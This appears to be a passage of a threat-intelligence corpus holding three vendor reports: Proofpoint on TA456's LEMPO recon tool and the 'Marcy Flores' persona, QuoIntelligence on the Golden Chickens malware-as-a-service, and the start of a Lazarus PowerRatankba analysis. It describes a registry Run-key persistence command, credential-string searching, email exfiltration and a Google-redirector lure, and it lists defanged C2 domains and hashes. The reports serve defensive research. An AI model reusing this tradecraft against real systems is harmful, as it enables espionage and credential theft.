(HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Schedule /t REG\_SZ /d C:\Users\[redacted\_username]\AppData\Perflog\Schedule.vbs /f) to ensure LEMPO is run upon user login. ![diet survey](/sites/default/files/inline-images/MicrosoftTeams-image%20%288%29.png) *Figure 2. The diet survey .xlsm file.* The macro in the Excel document also contains code to connect via HTTP POST to showip[.]net. The response, along with the results of ""net use"" and ""netstat -nao"" are stored in a hidden sheet within the .xlsm, reminiscent of the technique described in Facebook's July 15th announcement. Proofpoint analysts assess this may indicate code partially remaining from an earlier iteration of the tool that came before LEMPO or a desire for redundancy in TA456's reconnaissance tooling. ### LEMPO The LEMPO reconnaissance tool is a Visual Basic Script dropped by an Excel macro. Leveraging built-in Windows commands it enumerates the host in a variety of ways, records the collected data and then exfiltrates the intelligence to an actor-controlled email account using Microsoft’s Collaboration Data Objects (CDO). CDO, previously known as OLE Messaging or Active Messaging, is an application programming interface included with Microsoft Windows and Microsoft Exchange Server products. While most of this analysis is based off the sample blocked by Proofpoint (1534f95f49ddf2ada38561705f901e5938470c1678d6a81f0f4177ba7412ef5b) in June 2021, we also identified a similar sample (da65aa439e90d21b2cf53afef6491e7dcdca19dd1bbec50329d53f3d977ee089) uploaded to a public malware repository with an upload date of June 2020. ### Reconnaissance LEMPO collects the following information and records it to %temp%\Logs.txt * Date and time * Computer and usernames * System information via WMIC os, sysaccount, environment, and computer system commands * Antivirus products located in the “SecurityCenter2” path * Drives * Tasklist * Software and version * Net users and user details Following the connectivity check, detailed in the following section, LEMPO writes the following to %temp%\Logs.txt * Firewall rules * List of running processes via Powershell Get-Process * IP config * Domain hosts, users, computers, and local groups * Trusted domains * Network shares * Arp cache * Tracert * External IP (via showip.net) * Connections (netstat -nao) ### Connectivity Prior to the network focused reconnaissance, LEMPO checks connectivity by reaching out to Yandex, Google, Yahoo, Github, Mailchimp, Mega, Arxiv (an online academic repository specializing in electrical engineering and scientific research), and Twitter using ping and curl (Figure 3). The June 2020 version of LEMPO includes only a connectivity check to ford[.]com. ![Text Description automatically generated](data:image;base64_removed,) *Figure 3. *After finishing that additional recon, LEMPO moves Logs.txt from %temp% to \Perflog. LEMPO then checks to ensure the Registry Key previously mentioned has been added and then uses the findstr command to identify files containing “user,” “pass,” and “vpn. The findstr command returns any matching lines which could collect usernames and passwords from the computer. Logs.txt is then compressed into Logs.zip ### Exfiltration LEMPO uses hardcoded credentials with Microsoft’s CDO to exfiltrate the information over SMTPS on port 465. In the June 2021 version of LEMPO, TA456 uses the same Yahoo email address to send and receive the exfiltrated information. In the 2020 version of LEMPO, TA456 sent from a Yandex account to a Tutanota email account. Notably, the Yandex email within the 2020 version of the LEMPO implant masqueraded as large technology company focused on supporting the energy industry. After exfiltrating the information, LEMPO sleeps for 30 seconds and then deletes both Logs.txt and Logs.zip. ### There’s Something About Marcy “Marcella (Marcy) Flores” was conversing with the targeted aerospace employee since at least November 2020 and was friends with them on social media since at least 2019. Besides the Gmail account used for attempted malware delivery, Marcella maintained a now suspended [Facebook profile] (https://web.archive.org/web/*/https:/www.facebook.com/marcella.flores.14019). ![Graphical user interface Description automatically generated](data:image;base64_removed,) *Figure 4. *Open-source research indicates “Marcella” interacted with TA456’s target on social media starting in late 2019. The earliest publicly available Facebook profile photo of “Marcella” was uploaded on May 30, 2018. Proofpoint’s analysis indicates the profile bears strong similarities to fictitious profiles previously used by Iranian APTs to socially engineer targets of intelligence value. The “Marcella” profile appeared to be friends with multiple individuals who publicly identify as defense contractor employees and who are geographically dispersed from “Marcella’s” alleged location in Liverpool, UK. On July 15, 2021, [Facebook announced](https://about.fb.com/news/2021/07/taking-action-against-hackers-in-iran/) they had disrupted a network of Facebook and Instagram personas, including “Marcella’s,” they attributed to the Iranian-aligned actor. ### Targets TA456 routinely conducts reconnaissance campaigns disguised as news related spam that target individuals employed by aerospace defense contractors. The targeting of U.S. defense contractors, particularly those supporting contracts in the Middle East, is consistent with historical Iranian cyber activity. Additionally, Proofpoint has observed TA456 targeting individuals employed at multiple subcontractors and subsidiaries of larger defense companies. This is possibly an effort to target the primary contractor via less secure downstream component suppliers that share a network environment. Open-source research indicated the individual targeted by “Marcella” in this campaign works as a supply chain manager. This is consistent with TA456’s TTP of targeting business and information technology-related individuals within their target organization. ### Attribution Proofpoint attributes this campaign to TA456, an Iranian-aligned adversary focused on espionage efforts against defense industrial base employees and contractors, particularly those supporting efforts in the Middle East. TA456 overlaps with activity tracked as Tortoiseshell, and Imperial Kitten. On July 15, 2021, Facebook [attributed](https://about.fb.com/news/2021/07/taking-action-against-hackers-in-iran/) a portion of Tortoiseshell’s activity to Mahak Rayan Afraz (MRA), an Iranian IT company with ties to the IRGC. Based on previous malware analysis and historical open-source research, Proofpoint concurs with this attribution. Additionally, LEMPO shares multiple similarities with [Tortoiseshell’s Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html), including extensive machine reconnaissance, exfiltration via email, hardcoded email addresses with similar formatting, and overall pattern of targeting companies and individuals aligned with the American defense industrial base. ### Outlook TA456 demonstrated a significant operational investment by cultivating a relationship with a target’s employee over years in order to deploy LEMPO to conduct reconnaissance into a highly secured target environment within the defense industrial base. Facebook’s announcement demonstrated TA456 had established an extensive network of these personas dedicated to enabling cyberespionage operations. While Proofpoint did not observe the delivery of any remote access trojans or command and control channels like TA456’s [Syskit](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain), the information potentially gathered by LEMPO could be operationalized in a variety of ways. These include the utilization of stolen VPN credentials, exploitation of vulnerabilities in the identified software, or the customization of more advanced malware delivered from “Marcella. TA456’s dedication to significant social engineering engagement, benign reconnaissance of targets prior to deploying malware, and their cross platform kill chain establish TA456 to be one of the most resourceful Iranian-aligned threats tracked by Proofpoint. The “Marcella Flores” persona is likely not the only one in use by TA456, making it important for those working within or tangentially to the defense industrial base to be vigilant when engaging with unknown individuals regardless of whether it is via work or personal accounts."
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware.txt,quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware,G0080,"Golden Chickens: Uncovering a Malware-as-a-Service (MaaS) Provider Nov 29, 2018 (Note: This article was initially written by the QuoINT Team as part of QuoScient GmbH. Since the foundation of QuoIntelligence in March 2020, this article was transferred to this website on 21 April 2020. Executive Summary ----------------- Over the last few years, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) has tracked activities attributed to the Cobalt group, and observed their notable evolution and continuously improving Tactics, Techniques, and Procedures (TTPs). Since September 2018, we have identified multiple attacks that share similar TTPs used by Cobalt during a specific timeframe but exhibit enough differenced to attribute them to separate threat actors. This blog post provides an overview on a specific Malware-as-a-Service (MaaS) used within the e-Crime threat actor landscape. It also provides details on two different threat actors using the MaaS that fall under the umbrella of a family we dubbed *Golden Chickens*: GC01 and GC02. The success of Golden Chickens (GC) operations heavily relies on a specific MaaS sold in underground forums, which provides customers with the malwares and the infrastructure they need for targeted attacks. The service owner provides the MaaS through the use of the following toolkits: Venom and Taurus building kits for crafting documents used to deliver the attack, and the more\_eggs (aka Terra Loader, [SpicyOmelette](https://www.secureworks.com/blog/cybercriminals-increasingly-trying-to-ensnare-the-big-financial-fish)) backdoor for taking full control of the infected computer. Between November 2017 and July 2018, we attributed to GC02 five spear phishing waves which indiscriminately targeted companies and organizations in at least India and the United States. As a result of using the same MaaS provider, GC02 and Cobalt group’s TTPs and infrastructure strongly overlapped in May 2018, making it hard at first glance to differentiate the two threat actors. Between August and October 2018, we attributed to GC01 nine spear phishing waves targeting multiple companies and organizations operating in the financial industry. Throughout the campaign, we observed the installation of multiple Remote Access Tool (RAT) variations as the result of a successfully compromised victim machine. By highlighting the multi-layer infrastructure adopted by Cobalt and Golden Chickens, as well as the multi-client business model of the MaaS behind it, we emphasize the difficulty of performing reliable attribution for cyberattacks, and the high uncertainty that analysts are confronted with during the process. To note, other [researchers](https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/) reported the same Indicators of Compromise (IoC) and C2 infrastructure covered in this blog post. We hope that our attribution will clarify the current threat landscape and make the covered threat actor profiles more accurate. *The following blog post is a preview of the Intelligence Assessment we will disseminate to our clients, partners, and vetted* [*requesters*](/cdn-cgi/l/email-protection#127167607b7d67615263677d7b7c66777e7e7b75777c71773c7767)*.* Introduction ------------ Cyber attribution is becoming increasingly challenging as threat actors frequently use false flag techniques and shared infrastructure to increase the resiliency of their operations against takedowns and law enforcement investigations. Especially for e-Crime actors, it is a common practice to rent the same bulletproof infrastructure or botnet used by other e-Crime groups, resulting in the increased likelihood for an overlap of C2 servers. In the last years, we have noted a tendency of threat actors outsourcing even more parts of the kill-chain to third parties by using/offering MaaS solutions. Figure 1 shows an example of such a network where multiple stakeholders are involved. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1196/1*gTJyiniaHUv2LEtlrlgN_w.png) Figure 1 — Example of attribution complexity A threat actor can buy several malware from multiple developers, rent the C2 infrastructure from various providers, and deliver the attack vector to victims from yet another provider. This compartmentalized business relationship guarantees the threat actor an elevated level of privacy and deniability since the involved stakeholders rarely know the full scale of the operation. On the other hand, those providers offering MaaS solutions simplify the entire process through *One Stop Shop* solutions, where one single entity sells and rents both the malware and the infrastructure needed for an attack. When profiling e-Crime threat actors, we always deal with the hypothesis that the malware and C2 infrastructure we are analyzing do not belong to the threat actor *per se*, but rather to the used MaaS provider. When we confirm the use of a MaaS, the attribution process focuses on *how* and *when* threat actors used it, and *who* they targeted. By using such an approach, we were able to differentiate past spear phishing campaigns mistakenly attributed to the Cobalt group and characterize two distinct threat actors — GC01 and GC02 — and the MaaS used by them to carry out their attacks. Golden Chickens’ MaaS --------------------- From November 2017 to October 2018, we attributed 14 campaigns to the Golden Chickens (GC) threat actors that used a specific MaaS provider (hereinafter “*the Provider*”) offered by a known individual (hereinafter *“the Provider Operator”*). The following section explains the operational model of the Provider, and the toolkits used to deliver the requested service to paying customers. ### Operational workflow A typical business case between a threat actor and the Provider is shown in Figure 2 and detailed below. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1168/1*irO1qVlzmFq1q-R_jLxekw.png) Figure 2 –The Provider operational workflow 1.Threat actors buy the service offered and then give the Provider Operator the final payload to be executed on the infected machine. Since we have observed the same threat actor using the Provider to different extents, we assess that the Provider Operator’s offering is modular. 2.The Provider Operator builds the malicious document (maldoc), the backdoor, and prepares the server infrastructure needed for the execution of the attack. Next, the backdoor is stored on a webserver and the full URL path of it is embedded into the maldoc. Lastly, the C2 panel that the backdoor will beacon to is set up. 3.The Provider returns the maldoc to the threat actor. Although not confirmed, the Provider Operator also likely delivers the access details for the backdoor’s C2 web panel. 4.The threat actor disseminates (directly or through the use of a botnet) the maldoc via spear phishing. 5.Once the maldoc is executed on a victim’s machine, it will retrieve and execute the backdoor from the hardcoded web location. 6.The backdoor beacons to the hardcoded C2 on a regular basis and executes the commands it receives. 7.Finally, the threat actor (or the Provider) will review the system details of the infected machine reported by the backdoor, and eventually deploy the final payload. ### **Building Kits Used** The Provider relies on the use of specific malicious artifacts advertised in the underground since 2017. Those artifacts are generated by three building kits and offered to paying customers with the supporting C2 infrastructure. **VenomKit.** VenomKit is a tool that threat actors can use to craft malicious Rich Text File (RTF) documents that exploit multiple vulnerabilities, including CVE-2017–11882, CVE-2018–0802, and CVE-2018–8174. Successful exploitation leads to batch and scriptlet files being dropped and executed in order to download the second stage payload from a Web resource. The AV detection rate for RTF documents generated by VenomKit is *moderate* to *high* due to the exploitation of known vulnerabilities. **Taurus Builder Kit.** The Taurus Builder Kit generates Microsoft Word documents weaponized with malicious Visual Basic for Application (VBA) macro code. Unlike the malicious RTFs created by VenomKit, the weaponized Word documents require user interaction in order to enable the contained malicious code. On the other hand, documents generated by this kit are more resilient to AV detection due to the use of multiple layers of obfuscation in the VBA code. Once the VBA code is enabled by the user, documents created by Taurus Builder Kit will download and execute additional malware by using multiple legit Windows tools in order to bypass AppLocker. **More\_Eggs Backdoor.** More\_eggs is a JavaScript (JS) backdoor capable of beaconing to a fixed C2 server and executing additional payloads downloaded from an external Web resource. The backdoor is delivered encrypted inside of another JavaScript, with changing function names, variable names, and encryption keys. Overall, the technique used allows the Provider Operator to guarantee its clients a low AV detection rate. The more\_eggs building kit allows customization of its multiple variables, for values such as the C2 server, beaconing and sleeping time, and part of the cryptographic key used for ciphering the C2 communications. Figure 3 shows an example of more\_eggs configuration that includes the version number *BV*, C2 address *Gate*, and part of the ciphering key used to encrypt C2 communications, *Rkey*. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/942/1*Rs6xkEOMJUlq0Z8B_VDKoA.png) Figure 3– Excerpt of more\_eggs backdoor configured variables Threat actors can ask for the customization of the backdoor by requesting the addition of specific variables or entire functionalities. For instance, more\_eggs samples attributed to GC02 contained the extra variable *Researchers,* differently from the ones attributed to GC01 or Cobalt Group. Although not confirmed, it is reasonable to assume that multiple more\_eggs used by different threat actors cannot share the same *Gate* value due to the derived complication that would imply for the backend to understand which C2 communications belong to which threat actor using the infrastructure. However, the same C2 server can host multiple gates by using different web pages; hence, multiple threat actors might use distinct gates hosted on the same domain name. Additionally, the *Rkey* variable can be considered as something that is randomly generated every time a new sample is created for a customer (i.e. the relationship between the threat actor and RKey used is likely 1:1). Due to this consideration, we used the Rkey variable while clustering attacks together and attributing them to specific threat actor. The Provider Operator demonstrates notable efforts in keeping the more\_eggs backdoor updated by fixing bugs and adding new features: in the last year alone, we observed six different versions in use, from 2.0 to the most recent version 5.4. Notably, more\_eggs backdoors are also capable of automatically updating themselves to the latest version, and even updating the configured *Gate* variable. Threat Activity Analysis ------------------------ The following section highlights the operations and TTPs of three distinct threat actors that have used the Provider in the last year: the Cobalt Group, GC01 and GC02. ### Timeline analysis Figure 4 represents the multiple spear phishing campaigns we have attributed to either Cobalt[1] or the Golden Chickens (GC) family during the last year. While all GC campaigns used the Provider, only those attributed to Cobalt in May, June, and on 2 August used the Provider. QuoINT determines the level of confidence based on both the reliability of the information processed, and the extent of the analytic techniques adopted during the analysis. Our analysis distinguished three different threat actors based on the following factors: 1.**Targeting.** Which types of companies the threat actors targeted. 2.**Use of the MaaS.** How the Provider was used, to what extent, and the configuration requested. 3.**Final Payload.** What final payload the MaaS delivered. 4.**Time of attack.** When the threat actor used the Provider ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1158/1*Rs_FfAQwwik8NdrqyV7hBg.png) Figure 4 — Timeline analysis of attacks conducted by GC family and Cobalt Group In May 2018, Cobalt executed three different spear phishing campaigns in between two GC02 campaigns. The attacks leveraged the same Provider since they used maldocs generated by either VenomKit or Taurus Building Kit, more\_eggs, and the Provider’s C2 infrastructure. However, as also highlighted by [researchers](https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html), the attacks presented key differences based on (a) the targeting; (b) the attack vector, and; ( c) the more\_eggs configuration. Figure 4 also shows that the Cobalt group ceased to use the Provider after the campaign on 2 August, and then started to consistently use different malware and infrastructure. ### Tactics, Techniques, and Procedures Figure 5 details the TTPs we observed during all the attacks that leveraged the Provider. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1186/1*dv2ZoivxtxC0STiLAomYMQ.png) Figure 5 — Cobalt and GC campaigns using the Provider 1.Delivery.Each campaign began with a spear phishing email, but each presented differences depending on the threat actor behind the attack: * GC threat actors used either compromised or spoofed email addresses. Furthermore, GC01 targeted companies and organizations operating in the financial industry mainly in Europe, Africa, and Asia. Differently, GC02 indiscriminately targeted companies and organizations in at least India and the United States. * Cobalt also used compromised addresses but only in three attacks. The other 12 spear phishing emails were sent from domain names previously registered by them, imitating a specific organization. Registration of look-alike domains is a common technique used by Cobalt Group. Lastly, all Cobalt campaigns targeted financial institutions and organizations mainly in Europe, Asia and Middle East. 2.Exploitation I (Optional).Both threat actor groups used a non-malicious PDF, luring the user to click on the contained link in order to download the maldoc. The attackers used a technique known as [*Google Redirecto*r](https://www.securitysift.com/why-google-makes-my-job-more-difficult/) which consists of appending the malicious URL at the end of a Google logout URL. By doing this, the user will first visit the legit Google logout page and then automatically be redirected to the final URL, triggering the download of the malicious document. * GC01 always used this technique. GC02 used this technique in all but one campaign (10 July), which is one reason why we assessed such attribution with low confidence. * Cobalt only used this technique two times, during the campaigns of 7 and 29 June. It is not clear to us if the Provider Operator offers the non-malicious PDF (with Google Redirector technique) directly or recommends the use of a third-party kit. To note, we are aware of attacks in the wild using this technique, but without relying on the Provider altogether. 3.Exploitation II — Getting the Maldoc.The user downloads either a macro-weaponized Word document created by Taurus Builder Kit, or a malicious RTF created by VenomKit. Successful execution of the maldocs initiates the download of additional batch scripts and then the ultimate download of the more\_eggs backdoor. * GC01 and GC02 used newer more\_eggs versions: 3.0, 4.2, 4.4, 5.2 and 5.4. GC02 used the variable *Researchers* assigned with the value “*We are not cobalt gang, stop associating us with such skids!*“. * Cobalt Group only used more\_eggs versions 2.0, having a specific command named *via\_x*. This command is used to execute additional executables via cmd.exe. For those campaigns that were not using the non-malicious PDF attack vector, the victims got the downloader through either browsing a link included in the email body, or directly through the email attachment. 4.C2 I — Getting the Backdoor.The maldoc retrieves more\_eggs from a remote location and executes it. Next, the backdoor starts beaconing to the C2 defined in the *Gate* variable. 5.C2 II — Getting the Final Payload.Once the threat actor (or the Provider Operator) determines that the infected system is of interest, the final payload is eventually pushed and executed. To note, we were not always able to get the final payload because the more\_eggs C2 normally has a short lifetime. However, we were able to observe the following different payloads being distributed by the different threat actors: * Campaigns attributed to GC01 resulted in the download of three different RATs: Netwire, Remcos, and Revenge. * Campaigns attributed to Cobalt Group resulted in the download of either the CobInt backdoor, or the Cobalt Strike beacon. So far, CobInt is a backdoor that was only observed in Cobalt Group campaigns, while Cobalt Strike is a notorious attack framework used to execute Red Team exercises. We consider the use of CobInt and Cobalt Strike as a final payload a strong indicator while attributing attacks to the Cobalt Group. Conclusion ---------- In general, the continued adoption of threat actors leveraging MaaS plays two roles in the cyber threat landscape: (a) it enables less sophisticated actors to execute attack campaigns against high value targets, which may otherwise be out of scope due to the potentially multi-layer perimeter defenses, and; (b) it creates a cluster of technical indicators from the same infrastructure that complicates attribution efforts. During our analysis, we identified three threat actors utilizing one particular MaaS which has operated for almost two years, proving its success and profitability. As a result, this scenario of multiple actors using the same MaaS further corroborates why attribution of campaigns incorporating aspects of MaaS becomes more complex to distinguish due to the presumable overlap in technical indicators. QuoINT continues to track the activity of these threat actors to help our customers both identify and thwart potential attacks against their environments. *Our Intelligence Assessment will also cover the following points:* * *More information about the Provider, its Operator, and the services advertised:* * *Assessment on current and prospected capabilities of the Provider* * *In depth analysis of each spear phishing campaign covered* * *Full IoC list per Kit, TA, and campaign* * *Recommended Course of Actions* * *MITRE ATT&CK mapping* You can request it [here](/cdn-cgi/l/email-protection#9dfee8eff4f2e8eeddece8f2f4f3e9f8f1f1f4faf8f3fef8b3f8e8). [1] To note, we only included in the timeline those campaigns attributed to Cobalt group that used the Provider or occurred near or in the same month of GC’s activities. Hence, we excluded Cobalt’s activities occurring in January, February, and March 2018. Additionally, this reporting only includes intelligence obtained until October 2018. Indicators of Compromise ------------------------ ### GC01 **Email Subjects:** Payment Details REF # 18110486098 Payment Details REF # 18110486098 Re: Payment Ref 34981***** receive problem Re: Bank query / S-170526–005399 Amendment/Cancellation Fund Transfer 08-October-2018 Confirmations on October 16, 2018 confirmation-16003907 **Email Attachments (Not-Malicious PDF with Google Redirector)** 444c63bb794abe3d2b524e0cb2c8dcc174279b23b1bce949a7125df9fab25c1c 1c1a6bb0937c454eb397495eea034e00d1f7cf4e77481a04439afbc5b3503396 988d430ce0e9f19634cf7955eac6eb03e3b7774b788010c2a9742b38016d1ebf 1d0aae6cff1f7a772fac67b74a39904b8b9da46484b4ae8b621a6566f7761d16 57f65ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703e 852f11e5131d3dab9812fd8ce3cd94c1333904f38713ff959f980a168ef0d4ce **Google Redirector links** hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Fsafesecurefiles[.]com%2Fdoc041791[.]pdf hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Falotile[.]biz%2FDocument092018[.]doc hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Ffundsxe[.]com%2FDocument09202018[.]doc hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Ffundswp[.]com%2FDocument082018[.]doc hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Ftransef[.]biz%2FDoc102018[.]doc hxxps://appengine[.]google[.]com/\_ah/logout?continue=https%3A%2F%2Ffundsxe[.]com%2FDocument0922018[.]doc **Landing Page** hxxps://safesecurefiles[.]com/doc041791[.]pdf hxxps://alotile[.]biz/Document092018[.]doc hxxps://fundsxe[.]com/Document09202018[.]doc hxxps://fundswp[.]com/Document082018[.]doc hxxps://transef[.]biz/Doc102018[.]doc hxxps://fundsxe[.]com/Document0922018[.]doc **Maldocs** 19dc9b93870ddc3beb7fdeea2980c95edc489040e39381d89d0dfe0a825a1570 020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee 07a3355f81ff69a197c792847d0783bfc336181d66d3a36e6b548d0dbd9f5a9a 161ba501b4ea6f7c2c8d224e55e566fef95064e1ed059d8287bc07e790f740e8 19dc9b93870ddc3beb7fdeea2980c95edc489040e39381d89d0dfe0a825a1570 dc8425f8c966708b1a3c26f0545664ccbf853852af401b91ae7f29d351e2649c dc8425f8c966708b1a3c26f0545664ccbf853852af401b91ae7f29d351e2649c ### GC02 **Email Subjects:** Contract April Description of my complaint about your service **Email Attachments (Not-Malicious PDF with Google Redirector)** 45310fcc9f9ef367f16bed4c4ba4c51d7eb72550082cd572f6a5636227514d70 df18e997a2f755159f0753c4e69a45764f746657b782f6d3c878afb8befe2b69 **Google Redirector links** hxxps://appengine.googlecom/\_ah/logout?continue=hxxps://cloud.pallets32[.]com/Doc00581691.pdf hxxps://appenginegooglecom/\_ah/logout?continue=hxxps://cloudpallets32[.]com/Doc00581951pdf hxxps://appengine.google.com/\_ah/logout?continue=hxxps://mail.halcyonih[.]com/uploads/doc004718538.pdf **Landing Page** hxxps://cloud.pallets32[.]com/Doc00581691.pdf hxxps://cloudpallets32[.]com/Doc00581951.pdf hxxps://mail.halcyonih[.]com/uploads/doc004718538.pdf **Maldocs** 476c9d4383505429c10c31fb72f5218b3b42d985a2b46a0de62fd6ec5d08eebf 27ec680a57b658d0e63a2b209f407253b4d8904ea025b3ef7c544d98d5798356 a1f3388314c4abd7b1d3ad2aeb863c9c40a56bf438c7a2b71cbcff384d7e7ded ### GC Maas C2 infrastructure outlooklive.org[.]kz mail.yahoo.org[.]kz api.outlook[.]kz nl.web-cdn[.]kz api.toshiba.org[.]kz api.outlook[.]kz api.fujitsu.org[.]kz api.asus.org[.]kz api.miria[.]kz ww3.cloudfront.org[.]kz webmail.cloudfront.com[.]kz mail.halcyonih[.]com cloudpallets32[.]com contents[.]bz safesecurefiles[.]com usasecurefiles[.]com freecloud[.]biz alotile[.]biz fundswp[.]com transef[.]biz fundsxe[.]com document[.]cdn-one[.]biz [Learn more about our Threat Intelligence service](https://quointelligence.eu/#offering) * [Follow](https://twitter.com/QuoIntelligence ""Follow on Twitter"")[Follow](https://twitter.com/QuoIntelligence ""Twitter"") * [Follow](https://www.linkedin.com/company/quointelligence/ ""Follow on LinkedIn"")[Follow](https://www.linkedin.com/company/quointelligence/ ""LinkedIn"")"
annoctr,annoctr/AnnoCTR/text/train/quoteintelligence_2019-01-21_new-evidence-might-link-lazarus.txt,quoteintelligence_2019-01-21_new-evidence-might-link-lazarus,G0032,"New Evidence Might Link Lazarus Tool Found in Chile RedBanc Intrusion to Previous Attacks in Pakistan Jan 21, 2019 Note: This article was initially written by the QuoINT Team as part of QuoScient GmbH. Since the foundation of QuoIntelligence in March 2020, this article was transferred to this website on 21 April 2020. **Executive Summary** ===================== QuoINT has uncovered an attack against a Pakistani financial service provider’s employee that highly matched the Tactics, Techniques, and Procedures (TTPs) [reported](http://www.trendtic.cl/2019/01/exclusivo-asi-fue-el-intento-de-ciberataque-a-redbanc-en-diciembre/) in a recent intrusion at the Chilean interbank network Redbanc [linked by Flashpoint](https://www.flashpoint-intel.com/blog/disclosure-chilean-redbanc-intrusion-lazarus-ties/) to the prolific North Korea-linked Advanced Persistent Threat (APT) group Lazarus (also known as HIDDEN COBRA). Further, we uncovered new evidence that might link the November 2018 attacks against multiple Pakistani banks to Lazarus. More in detail, we discovered an attack that occurred on 31 October 2018, and highly likely led to the infection of the employee’s computer. However, we are not able to ascertain if the infection of the victim’s computer successfully led to the compromise of the company. Although the timeframe of the attack falls within a period where multiple sources reported cyberattacks against Pakistani financial institutions, at this point we cannot rule out that this attack was part of a different campaign. As we investigate further, we will disseminate Intelligence products to our partners and customers. **Introduction** ---------------- On 16 January 2019, we identified a sample on VirusTotal which is almost identical to the one reportedly used to attack the Chilean financial institution Redbanc in late December 2018. The sample, named ApplicationPDF.exe, was uploaded from Pakistan to VirusTotal on January 16 as a part of a ZIP archive, which also contained a generated PDF and the Windows DLL required for its execution. The PDF contains what is highly likely the personal information of the targeted victim.[1] Further OSINT analysis revealed the victim being an employee at a financial services provider in Pakistan and knowledgeable in financial systems and technologies including Point-of-Sales (POS) and Automated Teller Machine (ATMs). The targeted profile matches the one described by Chilean newspapers while detailing the attack against RedBanc. The timestamps obtained from analyzing the artifacts place this incident within a period where multiple Pakistani sources reported incidents against the local banking sector, such as the compromise of BankIslami that reportedly resulted in the loss of RS 2.6 million. Figure 1 highlights the timeline of malicious activity targeting both Pakistan and Chile. More specifically, the timeline highlights: * 21 total banks notifying their customers of multiple credit card dumps for sale on the dark web (26 and 31 October); * BankIslami reporting suspicious transactions resulting in RS 2.6 of losses (27 October); * The date an unknown user located in Chile uploaded the alleged malware sample used to target RedBanc (13 December); and * The date the highly likely compromised user in Pakistan submitted the malware sample used to target him (16 January). It is unknown, however, if this newly discovered activity is related to any of the publicly reported Pakistani incidents ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/3146/1*vfN6xFPBVXy1gmzT00IksQ.png) Figure 1 — Timeline analysis Technical Analysis ------------------ According to the reported disclosure of the RedBanc intrusion, the lure begins with a job offer posted to a social media network (LinkedIn). After clicking to apply, attackers contact the person inquiring and an interview conversation occurs, in an attempt to validate the scheme and build trust. The interviewer eventually asks applicants to download and execute a tool (ApplicationPDF.exe) on their computer in order to generate their application form in PDF format. The execution of the tool kicks off the infection process. Our initial discovery consisted of a variant of the ApplicationPDF.exe binary reportedly used against the Chilean bank. The two variants are virtually the same, differing by the compilation timestamps as the figure below shows. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1752/1*A-hUwSEgB_8Wd20CfhSPDA.png) Figure 2 — ApplicationPDF.exe variants Shortly after, we identified a compressed archive also uploaded to VirusTotal containing the exact same sample, along with two additional non-malicious files, one of which is interesting for our victimology efforts.[2] ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/690/1*noZvzBWg_MdP5CAnhB8awg.png) **Figure 3** — QuoLab screenshot of the similarity in the kill-chain between tool variants used in Chile and Pakistan **AppplicationPDF.exe** **SHA-256:** 0e3552c8232e007f421f241ea4188ea941f4d34eab311a5c2341488749d892c7 (Variant #1) Similar to the dropper used in the Chilean RedBanc attack, this tool is a GUI program (Figure 4) faking an application form. Besides the compilation timestamp, the two variants are virtually the same. The evidence obtained suggests that the victim executed ApplicationPDF.exe: the compressed archive we found also included the PDF that was most likely generated by the victim. ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1004/1*HSRzH4citBTUhhmUSj3ZzA.png) ![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) ![](https://miro.medium.com/max/1004/1*S-MPNRVxlXTZpZvhV8go6w.png) **Figure 4 —** *Dropper disguised as an application form* Once executed, the sample communicates the C2 URL (hxxps://ecombox[.]store/tbl\_add[.]php?action=agetpsb), and after connecting, it drops a script file (REG\_TIME.ps1) used to invoke the PowerShell process. **PowerRatankba variant** (REG\_TIME.ps1) **SHA-256:** a1f06d69bd6379e310b10a364d689f21499953fa1118ec699a25072779de5d9b The script arrives encrypted and will decrypt itself in memory to the following sample: **Decrypted\_PowerRatankba variant** (REG\_TIME.ps1) **SHA-256:** 9797ad321f2eb123c3531d007295b8d4a672a40afd8b1681974b5349bab55ba1 PowerRatankba is a PowerShell based reconnaissance tool that conducts initial information gathering from the victim’s system and functions as a backdoor. In both Chile and Pakistan, the same variant is delivered, thus, accepts the same six commands, contains the same hardcoded C2 URL (hxxps://ecombox[.]store/tbl\_add.php) and commented out C2 (hxxps://bodyshoppechiropractic[.]com/tbl\_add.php). The backdoor functionality provided by the toolkit could enable the actor to deploy further stages of the attack if the victim’s system 